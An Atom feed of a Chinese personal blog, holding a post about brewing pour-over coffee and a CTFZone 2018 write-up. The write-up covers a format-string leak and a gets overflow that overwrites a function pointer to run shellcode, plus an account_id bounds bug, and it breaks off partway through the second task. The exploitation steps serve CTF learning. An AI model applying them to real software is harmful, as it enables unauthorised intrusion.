@@ -1,0 +1,1734 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+<title type="text">/home/cubarco</title>
+<generator uri="https://github.com/jekyll/jekyll">Jekyll</generator>
+<link rel="self" type="application/atom+xml" href="https://cubl.in/feed.xml" />
+<link rel="alternate" type="text/html" href="https://cubl.in" />
+<updated>2021-05-21T09:56:33+00:00</updated>
+<id>https://cubl.in/</id>
+<author>
+  <name>Cubarco</name>
+  <uri>https://cubl.in/</uri>
+  <email>i at cubl.in</email>
+</author>
+
+
+<entry>
+  <title type="html"><![CDATA[手冲咖啡初体验]]></title>
+  <link rel="alternate" type="text/html" href="https://cubl.in/blog/2021/03/pour-over-coffee-self-made-first-experience/" />
+  <id>https://cubl.in/blog/2021/03/pour-over-coffee-self-made-first-experience</id>
+  <published>2021-03-11T00:00:00+00:00</published>
+  <updated>2021-03-11T00:00:00+00:00</updated>
+  <author>
+    <name>Cubarco</name>
+    <uri>https://cubl.in</uri>
+    <email>i at cubl.in</email>
+  </author>
+  <content type="html">&lt;p&gt;今天手冲壶和滤杯终于到了。第一次自己做手冲，万万没想到，居然感动到想要重启三年没更的博客来记录一下。&lt;/p&gt;
+
+&lt;h2 id=&quot;感动现场&quot;&gt;感动现场&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;https://images.pwn.icu/1615537495017-upload_c02e52135903416493f262e1b592e936.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;技术总结&quot;&gt;&lt;del&gt;技术总结&lt;/del&gt;&lt;/h2&gt;
+&lt;h3 id=&quot;豆子&quot;&gt;豆子&lt;/h3&gt;
+&lt;p&gt;云南阿拉比卡，水洗，中深烘焙&lt;/p&gt;
+
+&lt;p&gt;就是下面这位：
+&lt;img src=&quot;https://images.pwn.icu/1615536675557-20210312161113.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;萃取细节&quot;&gt;萃取细节&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;15克&lt;/strong&gt;咖啡粉（泰摩磨豆机20格细度），&lt;strong&gt;萃取总量200克&lt;/strong&gt;（闷蒸注水45克，时间15秒；因为第一次冲，闷蒸阶段一开始注水量过大，给的水基本都透过去了）。&lt;/p&gt;
+
+&lt;p&gt;其实冲完第一壶，磨好的粉还剩8克，所以又冲了110克，这第二壶的口感就酸多了，不知道为什么，以后慢慢玩。&lt;/p&gt;
+
+&lt;h2 id=&quot;体验&quot;&gt;体验&lt;/h2&gt;
+&lt;p&gt;列举一下喝到咖啡时，脑子蹦出的词：&lt;strong&gt;顺滑，醇厚，甜感…&lt;/strong&gt; 比之前喝到的咖啡都要舒服得多。至少比今天下午开的中药好喝不少：
+&lt;img src=&quot;https://images.pwn.icu/1615537531629-upload_d292a53f7aad1420cbbe0a7e702c0a60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;手冲装备没到之前，都用家里的意式玩具机做咖啡。玩具机出品的意式，直接喝顶不住，很酸、很苦（听说还有口萃咖啡豆的，虽然感觉是梗，但还是有点厉害…)。做了各种奶咖，好喝是好喝，却又感觉咖啡味淡了点。&lt;/p&gt;
+
+&lt;p&gt;难怪这么多人喜欢自己做手冲，滤杯和手冲壶都不贵，做起来方便，喝起来舒服，完事儿又好清洗，确实是不错的体验。&lt;/p&gt;
+
+&lt;p&gt;&lt;del&gt;写完博客时已经过了一个多小时了，哇，还是回味无穷。&lt;/del&gt;&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;https://cubl.in/blog/2021/03/pour-over-coffee-self-made-first-experience/&quot;&gt;手冲咖啡初体验&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubl.in&quot;&gt;/home/cubarco&lt;/a&gt; on March 11, 2021.&lt;/p&gt;</content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Writeup: CTFZone 2018 Quals]]></title>
+  <link rel="alternate" type="text/html" href="https://cubl.in/blog/2018/07/writeup-ctfzone/" />
+  <id>https://cubl.in/blog/2018/07/writeup-ctfzone</id>
+  <updated>2018-07-24T00:00:00-00:00</updated>
+  <published>2018-07-23T00:00:00+00:00</published>
+  
+  <author>
+    <name>Cubarco</name>
+    <uri>https://cubl.in</uri>
+    <email>i at cubl.in</email>
+  </author>
+  <content type="html">&lt;div id=&quot;entry-table-of-contents&quot; class=&quot;toc-wrapper&quot;&gt;
+  &lt;h2 id=&quot;toc-toggle&quot; class=&quot;no_toc&quot;&gt;
+  Table of Contents &lt;i class=&quot;toc-toggle-icon fa fa-chevron-down&quot;&gt;&lt;/i&gt;
+&lt;/h2&gt;
+&lt;ol id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#easypwn_strings&quot; id=&quot;markdown-toc-easypwn_strings&quot;&gt;easypwn_strings&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#mobile-bank&quot; id=&quot;markdown-toc-mobile-bank&quot;&gt;Mobile Bank&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;/div&gt;
+
+&lt;p&gt;两道PWN题, 一个easypwn_strings, 一个Mobile Bank.&lt;/p&gt;
+
+&lt;h1 id=&quot;easypwn_strings&quot;&gt;easypwn_strings&lt;/h1&gt;
+
+&lt;h3 id=&quot;问题&quot;&gt;问题&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;You can try to use very interesting and strange string functions ;) Good luck. &lt;code class=&quot;highlighter-rouge&quot;&gt;nc pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one 1234&lt;/code&gt; And yes, there is no binary here&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;这是一道&lt;strong&gt;盲pwn&lt;/strong&gt;类型的题，没有提供二进制&lt;del&gt;(名义上的)&lt;/del&gt;。&lt;/p&gt;
+
+&lt;p&gt;nc连上之后回显：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Let's choose string operation!
+	1. StrLen
+	2. SubStrRemove
+	3. StrRemoveLastSymbols
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;第一个选项：输入一个字符串，回显字符串长度。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;You choise - 1
+	Use str
+	good choise
+123
+	Result: 3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;第二个选项显示未实现。&lt;/p&gt;
+
+&lt;p&gt;第三个选项：输入一个字符串，和一个数字，服务端移除末尾指定长度的字符串后打印出来。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;You choise - 3
+	Use str int
+	good choise
+	Set string:
+1234567
+	Set number:
+3
+	Delete 3 ending symbols
+	Result:
+1234
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;思路&quot;&gt;思路&lt;/h3&gt;
+
+&lt;p&gt;既然是无ELF文件的盲pwn，那只能摸着石头过河。做题时有以下几个尝试：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;del&gt;三个选项的输入是否有溢出；&lt;/del&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;del&gt;未实现的选项2是否有隐藏功能；&lt;/del&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;del&gt;选项3输入的数字是否可以为负数，可能造成字符串拷贝时的溢出或者泄密问题；&lt;/del&gt;&lt;/li&gt;
+  &lt;li&gt;…&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;很多尝试以失败告终。最终找到的漏洞是功能3的&lt;strong&gt;格式化字符串漏洞&lt;/strong&gt;：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;You choise - 3
+	Use str int
+	good choise
+	Set string:
+%p %p %p
+	Set number:
+0
+	Delete 3 ending symbols
+	Result:
+0xffe96350 0x8 0xf75fc1a4
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;我们可以利用这个格式化字符串漏洞构造一个任意地址读，然后把内存中的ELF dump下来。&lt;/p&gt;
+
+&lt;p&gt;怎么dump？可以参考YouTube上一个视频：&lt;a href=&quot;https://www.youtube.com/watch?v=XuzuFUGuQv0&quot;&gt;Format String to dump binary and gain RCE - 33c3ctf ESPR (pwn 150)&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;这道题和ESPR有两点区别：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;ESPR的输入只限制了&lt;code class=&quot;highlighter-rouge&quot;&gt;\n&lt;/code&gt;字符，但是这题的输入不能包含&lt;code class=&quot;highlighter-rouge&quot;&gt;\n&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;\x00&lt;/code&gt;，猜测是用了&lt;code class=&quot;highlighter-rouge&quot;&gt;fgets&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;strcpy&lt;/code&gt;。所以在dump下来的二进制中会有一些遗漏位，不过对这道题来说无伤大雅；&lt;/li&gt;
+  &lt;li&gt;ESPR一个进程循环不断调用&lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt;，但是这题进程只有一个流程，没有循环，所以需要不断与服务器创建连接，十分耗时。好在需要dump的是ELF，内容是固定的。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;dump脚本：&lt;/p&gt;
+
+&lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/9bfafbc77dd2c0330e3c0ef87013c6fa&quot; data-gist-file=&quot;strings-dump.py&quot;&gt;&lt;p&gt;Gist: &lt;a href=&quot;https://gist.github.com/cubarco/9bfafbc77dd2c0330e3c0ef87013c6fa&quot;&gt;cubarco/9bfafbc77dd2c0330e3c0ef87013c6fa&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;漏洞gets溢出&quot;&gt;漏洞（gets溢出）&lt;/h3&gt;
+
+&lt;p&gt;把ELF dump下来之后跑一下&lt;code class=&quot;highlighter-rouge&quot;&gt;strings dump.raw&lt;/code&gt;，看到一些有意思的字符串：&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings dump.raw
+...
+	Delete %i ending symbols
+	Result:
+https://ctf.bi.zone/files/babypwn
+https://ctf.bi.zone/files/babylibc
+main.c
+Have a &lt;span class=&quot;nb&quot;&gt;nice &lt;/span&gt;day!
+ctfzone&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1t_1s_&lt;span class=&quot;nv&quot;&gt;$uP6r_F4k6_4H4H&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+ctfzone&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$uP6r_F4k6_4H4H4H_t00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;del&gt;除了有两行假装是flag的信息，还&lt;/del&gt;有两行URL，看来是提供了二进制和libc的：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;https://ctf.bi.zone/files/babypwn&lt;/li&gt;
+  &lt;li&gt;https://ctf.bi.zone/files/babylibc&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;IDA打开babypwn，发现main函数还藏了两个菜单选项：&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IO_getc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;_IO_getc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'1'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'2'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'3'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'X'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'T'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'S'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;You choise - %c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+  	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'X'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'T'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Are you surprised?? (y or n)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gets_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gets_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'y'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;func_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt;是明显的危险函数，&lt;code class=&quot;highlighter-rouge&quot;&gt;gets_buf&lt;/code&gt;上存在溢出，再看溢出到哪：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.bss:080492E0 ; char gets_buf[256]
+.bss:080492E0 gets_buf        db 100h dup(0)          ; DATA XREF: main+62↑o
+.bss:080492E0                                         ; main+245↑o ...
+.bss:080493E0 ; int (__cdecl *func_ptr)(_DWORD, _DWORD, _DWORD)
+.bss:080493E0 func_ptr        dd 0                    ; DATA XREF: main+18F↑w
+.bss:080493E0                                         ; main+1AE↑w ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;可以盖到&lt;code class=&quot;highlighter-rouge&quot;&gt;func_ptr&lt;/code&gt;这个函数指针，所以这个溢出已经可以用来&lt;strong&gt;劫持控制流&lt;/strong&gt;了。&lt;/p&gt;
+
+&lt;h3 id=&quot;exp&quot;&gt;EXP&lt;/h3&gt;
+
+&lt;p&gt;checksec一下babypwn文件:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[*] '/tmp/babypwn'
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;有RWX的段，用GDB挂上ELF看一下map:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef&amp;gt; vmmap
+Start      End        Offset     Perm Path
+0x08048000 0x0804c000 0x00000000 rwx /tmp/babypwn
+0x0804c000 0x0804d000 0x00000000 rw- [heap]
+0xf7dbf000 0xf7f93000 0x00000000 r-x /usr/lib32/libc-2.27.so
+0xf7f93000 0xf7f94000 0x001d4000 --- /usr/lib32/libc-2.27.so
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;整个ELF都是RWX的&lt;del&gt;(这题有毒…)&lt;/del&gt;，那很简单了，之前溢出的&lt;code class=&quot;highlighter-rouge&quot;&gt;gets_buf&lt;/code&gt;就在bss段上，可写可执行，还知道地址。只要把shellcode写到&lt;code class=&quot;highlighter-rouge&quot;&gt;gets_buf&lt;/code&gt;上，然后溢出到&lt;code class=&quot;highlighter-rouge&quot;&gt;func_ptr&lt;/code&gt;，指向&lt;code class=&quot;highlighter-rouge&quot;&gt;gets_buf&lt;/code&gt;，就执行shellcode了。&lt;/p&gt;
+
+&lt;p&gt;利用脚本：&lt;/p&gt;
+
+&lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/9bfafbc77dd2c0330e3c0ef87013c6fa&quot; data-gist-file=&quot;strings-exp.py&quot;&gt;&lt;p&gt;Gist: &lt;a href=&quot;https://gist.github.com/cubarco/9bfafbc77dd2c0330e3c0ef87013c6fa&quot;&gt;cubarco/9bfafbc77dd2c0330e3c0ef87013c6fa&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;mobile-bank&quot;&gt;Mobile Bank&lt;/h1&gt;
+
+&lt;h3 id=&quot;问题-1&quot;&gt;问题&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;We bring your attention to a new, unique product: “Mobile Bank”! It’s a completely secure banking server running on mobile platforms. Now the Bank is in your pocket! &lt;code class=&quot;highlighter-rouge&quot;&gt;nc pwn-04.v7frkwrfyhsjtbpfcppnu.ctfz.one 1337&lt;/code&gt;&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;https://ctf.bi.zone/files/mobile_bank.45115ff5f655d94fc26cb5244928b3fc&quot;&gt;mobile_bank&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;下载二进制，checksec一下：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[*] '/pwn/bank/mobile_bank'
+    Arch:     arm-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x10000)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;是一个arm32的二进制。nc连上去看是什么内容：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;         _._._                       _._._
+        _|   |_                     _|   |_
+        | ... |_._._._._._._._._._._| ... |
+        | ||| |  o NATIONAL BANK o  | ||| |
+        | &quot;&quot;&quot; |  &quot;&quot;&quot;    &quot;&quot;&quot;    &quot;&quot;&quot;  | &quot;&quot;&quot; |
+   ())  |[-|-]| [-|-]  [-|-]  [-|-] |[-|-]|  ())
+  (())) |     |---------------------|     | (()))
+ (())())| &quot;&quot;&quot; |  &quot;&quot;&quot;    &quot;&quot;&quot;    &quot;&quot;&quot;  | &quot;&quot;&quot; |(())())
+ (()))()|[-|-]|  :::   .-&quot;-.   :::  |[-|-]|(()))()
+ ()))(()|     | |~|~|  |_|_|  |~|~| |     |()))(()
+    ||  |_____|_|_|_|__|_|_|__|_|_|_|_____|  ||
+ ~ ~^^ @@@@@@@@@@@@@@/=======\@@@@@@@@@@@@@@ ^^~ ~
+      ^~^~                                ~^~^
+*******************$$$Menu$$$*******************
+* 1 - info                                     *
+* 2 - set account id                           *
+* 3 - set account note                         *
+* 4 - make transaction                         *
+* 5 - print account info                       *
+* 6 - enable debug                             *
+* 0 - exit                                     *
+************************************************
+Your choice:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;还是一道菜单题。大概意思是这是一个bank，选项1打印当前的账户id和debug是否开启；选项2设置当前操作的账户id；选项3设置这个账户的note；选项4给当前账户加上指定数额的金钱数；选项5打印当前账户的id、账户余额、账户note；选项6打开debug功能。&lt;/p&gt;
+
+&lt;p&gt;用IDA打开，看到有一个选项7，&lt;code class=&quot;highlighter-rouge&quot;&gt;debug_info&lt;/code&gt;：&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;debug_enabled&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;debug_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+          &lt;span class=&quot;nf&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Invalid command!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;这个debug_info的功能是，打印出所有16个账户的id、余额和note 。&lt;/p&gt;
+
+&lt;h3 id=&quot;漏洞&quot;&gt;漏洞&lt;/h3&gt;
+
+&lt;h4 id=&quot;1-account_id越界&quot;&gt;1. account_id越界&lt;/h4&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;set_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0@1&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter account id: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;readint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;account_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Wrong account id!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
